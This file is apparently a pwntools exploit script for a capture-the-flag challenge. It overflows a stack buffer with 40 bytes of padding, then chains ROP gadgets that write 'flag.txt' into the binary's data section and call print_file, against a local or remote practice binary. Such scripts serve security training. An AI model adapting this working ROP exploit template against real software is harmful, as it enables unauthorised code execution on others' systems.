from pwn import *
import sys

is_debug = False
gdbscript = f'''
    init-pwndbg
    b *pwnme+72
    r < payload.txt
    '''.format(**locals())

def dealing_with_arguments():
    '''
    Determine local vs remote execution
    '''

    if len(sys.argv) > 1:
        if sys.argv[1].lower() == "remote":
            return remote('saturn.picoctf.net', 54100)

        elif sys.argv[1].lower() == "gdb":
            return gdb.debug([program], gdbscript=gdbscript)
            # io = elf.process()
            # is_debug = True
        elif sys.argv[1].lower() == "local":
            return elf.process()
        else:
            print("usage of this script: script.py remote/gdb/local executable_program")
            exit()
    else:
        print("usage of this script: script.py remote/gdb/local executable_program")
        exit()

# Set up pwntools for the correct architecture
program = f'./{sys.argv[2]}'
elf = context.binary = ELF(program,checksec=False)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = dealing_with_arguments()

data_section = 0x601028
pop_r14_r15 = 0x400690
pop_rdi = 0x400693
mov_r14_r15 = 0x400628
print_file_function = 0x400510
padding = 40


payload = flat(
    asm('nop') * padding,
    pop_r14_r15,
    data_section,
    'flag.txt',
    mov_r14_r15,
    pop_rdi,
    data_section,
    print_file_function
)

# Write payload to txt file
write('payload.txt', payload)

# Send the payload
io.sendlineafter(b'>', payload)

# Receive the flag
print(io.recvall().decode())